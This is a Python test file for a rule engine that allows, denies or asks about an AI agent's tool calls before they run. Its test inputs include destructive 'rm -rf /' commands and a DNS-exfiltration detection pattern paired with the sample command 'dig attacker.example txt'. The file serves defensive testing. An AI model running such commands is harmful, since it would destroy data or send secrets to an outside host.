# Modified by Samtek for Recon. Derived from Apache-2.0 Strix (OmniSecure Inc.). See NOTICE.
"""Tests for the allow/deny/ask rule engine (strix.core.interception)."""

from __future__ import annotations

from strix.core import interception
from strix.core.interception import InterceptionRule, evaluate


def _rule(
    id: str,  # noqa: A002
    *,
    field: str = "tool_name",
    pattern: str,
    action: str,
    regex: bool = False,
    description: str = "",
) -> InterceptionRule:
    return InterceptionRule(
        id=id, field=field, pattern=pattern, action=action, regex=regex, description=description
    )


def test_no_rules_is_implicit_allow() -> None:
    assert evaluate(None, "exec_command", '{"command": "rm -rf /"}') is None
    assert evaluate([], "exec_command", '{"command": "rm -rf /"}') is None


def test_no_match_is_implicit_allow() -> None:
    rules = [_rule("deny-foo", pattern="foo_tool", action="deny")]
    assert evaluate(rules, "exec_command", "{}") is None


def test_substring_match_on_tool_name() -> None:
    rules = [_rule("deny-exec", pattern="exec_command", action="deny")]
    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.action == "deny"
    assert decision.rule.id == "deny-exec"


def test_substring_match_on_tool_input() -> None:
    rules = [_rule("ask-rm", field="tool_input", pattern="rm -rf", action="ask")]
    decision = evaluate(rules, "exec_command", '{"command": "rm -rf /data"}')
    assert decision is not None
    assert decision.action == "ask"

    assert evaluate(rules, "exec_command", '{"command": "ls -la"}') is None


def test_regex_match_on_tool_input() -> None:
    rules = [
        _rule(
            "deny-exfil-dns",
            field="tool_input",
            pattern=r"\bdig\s+.*\btxt\b",
            action="deny",
            regex=True,
        )
    ]
    decision = evaluate(rules, "exec_command", '{"command": "dig attacker.example txt"}')
    assert decision is not None
    assert decision.action == "deny"
    assert evaluate(rules, "exec_command", '{"command": "dig attacker.example a"}') is None


def test_invalid_regex_is_skipped_not_raised() -> None:
    rules = [
        _rule("broken", field="tool_input", pattern="(unterminated", action="deny", regex=True),
        _rule("fallback", field="tool_name", pattern="exec_command", action="ask"),
    ]
    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.rule.id == "fallback"


def test_first_match_wins_in_list_order() -> None:
    rules = [
        _rule("allow-read", pattern="view_", action="allow"),
        _rule("deny-everything-else", pattern="", action="deny"),
    ]
    allowed = evaluate(rules, "view_request", "{}")
    assert allowed is not None
    assert allowed.rule.id == "allow-read"
    assert allowed.action == "allow"

    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.rule.id == "deny-everything-else"


def test_context_helpers_default_safely() -> None:
    assert interception.rules_from_context(None) is None
    assert interception.rules_from_context({}) is None
    assert interception.gateway_from_context({}) is None
    assert interception.ask_timeout_from_context(None) == interception.DEFAULT_ASK_TIMEOUT_SECONDS
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": None}) == (
        interception.DEFAULT_ASK_TIMEOUT_SECONDS
    )
    # Zero or negative is a real value: no budget left, not "use the default".
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": 0}) == 0.0
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": -30}) == 0.0
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": 45}) == 45.0


def test_one_input_form_whichever_path_produced_it() -> None:
    parsed = {"cmd": "rm -rf /tmp/é", "b": 1}
    raw_spaced = '{ "b": 1,\n  "cmd": "rm -rf /tmp/\\u00e9" }'
    raw_other_order = '{"cmd":"rm -rf /tmp/\\u00e9","b":1}'
    canonical = interception.canonical_tool_input(parsed)
    assert canonical == '{"b": 1, "cmd": "rm -rf /tmp/é"}'  # the form patterns were written for
    assert interception.canonical_tool_input(raw_spaced) == canonical
    assert interception.canonical_tool_input(raw_other_order) == canonical


def test_non_json_input_is_left_alone() -> None:
    assert interception.canonical_tool_input("*** Begin Patch") == "*** Begin Patch"
    assert interception.canonical_tool_input("42") == "42"


def test_a_tool_input_rule_matches_every_encoding_of_the_same_call() -> None:
    rules = [_rule("ask-rm", field="tool_input", pattern='"cmd": "rm -rf', action="ask")]
    for raw in ('{"cmd": "rm -rf /x"}', '{ "cmd":"rm -rf /x" }', {"cmd": "rm -rf /x"}):
        decision = evaluate(rules, "exec_command", raw)  # type: ignore[arg-type]
        assert decision is not None and decision.action == "ask", raw


def test_a_lone_surrogate_does_not_make_the_canonical_form_unencodable() -> None:
    canonical = interception.canonical_tool_input('{"x": "\\ud800"}')
    canonical.encode("utf-8")  # must not raise
    assert "ud800" in canonical


def test_escaping_a_lone_surrogate_keeps_other_non_ascii_text_matchable() -> None:
    canonical = interception.canonical_tool_input('{"cmd": "echo 秘密", "note": "\\ud800"}')
    canonical.encode("utf-8")
    assert "秘密" in canonical and "ud800" in canonical


def test_recorded_inputs_are_scoped_to_the_agent_that_evaluated_them() -> None:
    shared: dict = {}
    parent = {"agent_id": "a", "k": shared}
    child = {"agent_id": "b"}
    interception.remember_evaluated(parent, "call-1", "alpha", verbatim=True)
    # A child context shares the parent's map and may reuse the same call id.
    child[interception.EVALUATED_CALLS_KEY] = parent[interception.EVALUATED_CALLS_KEY]
    interception.remember_evaluated(child, "call-1", "beta", verbatim=False)
    assert interception.evaluated_for(parent, "call-1") == ("alpha", True)
    assert interception.evaluated_for(child, "call-1") == ("beta", False)


def test_deadline_helper_defaults_to_none() -> None:
    assert interception.ask_deadline_at_from_context(None) is None
    assert interception.ask_deadline_at_from_context({"ask_deadline_at": None}) is None
    assert interception.ask_deadline_at_from_context({"ask_deadline_at": 1234.5}) == 1234.5


def test_regex_rules_use_the_ascii_classes_the_control_plane_validated() -> None:
    r"""RE2's \w, \d and \b are ASCII; the engine compiles with re.ASCII to match."""
    rule = _rule("deny-word", field="tool_input", pattern=r"^\w+$", action="deny", regex=True)
    assert evaluate([rule], "t", "abc", verbatim=True) is not None
    assert evaluate([rule], "t", "é", verbatim=True) is None


def test_a_converted_tool_unwraps_its_payload_even_with_extra_arguments() -> None:
    """The converted tool executes the payload field and ignores other arguments, so
    that field is what a rule must see, whatever else the model sent."""
    args = {"patch": "*** Begin Patch", "note": "extra"}
    assert interception.call_input("apply_patch", args, payload_field="patch") == (
        "*** Begin Patch",
        True,
    )


def test_an_ordinary_tool_is_never_unwrapped_even_with_a_payload_like_field() -> None:
    args = {"patch": "harmless", "path": "/etc/hosts"}
    text, verbatim = interception.call_input("apply_patch", args)
    assert verbatim is False and "/etc/hosts" in text


def test_a_tool_that_is_not_converted_is_matched_in_full() -> None:
    args = {"input": "safe", "path": "/etc"}
    text, verbatim = interception.call_input("unregistered_tool", args)
    assert verbatim is False and "/etc" in text
